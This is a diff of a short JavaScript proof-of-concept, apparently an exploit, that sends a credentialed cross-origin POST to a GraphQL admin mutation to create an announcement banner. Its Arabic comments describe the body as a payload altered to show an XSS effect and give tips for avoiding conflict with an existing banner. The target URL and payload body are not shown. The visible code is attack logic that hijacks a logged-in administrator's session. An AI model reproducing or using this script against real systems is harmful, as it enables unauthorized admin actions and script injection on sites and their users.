@@ -4,7 +4,7 @@ function createAnnouncement() {
 
   xhttp.open("POST", url, true);
 
-  // الرؤوس الهامة بناءً على الـ Payload الجديد
+  
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.setRequestHeader("Accept", "*/*");
   xhttp.setRequestHeader("X-Apollo-Operation-Name", "CreateFormCreateAdminAnnouncementBannerMutation");
@@ -13,7 +13,7 @@ function createAnnouncement() {
 
   xhttp.withCredentials = true;
 
-  // بناء جسم الطلب - قمت بتعديل النص ليظهر أثر الـ XSS بوضوح
+ 
   var data = JSON.stringify([{
     "operationName": "CreateFormCreateAdminAnnouncementBannerMutation",
     "variables": {
@@ -46,3 +46,4 @@ function createAnnouncement() {
 }
 
 createAnnouncement();
+//ملاحطة مهمة مش لازم يكون في Announcement شغالة عشان ما يصير تضارب اذا كان في وحدة شغالة فينصح ب استخدام كود التعديل على الشغالة 
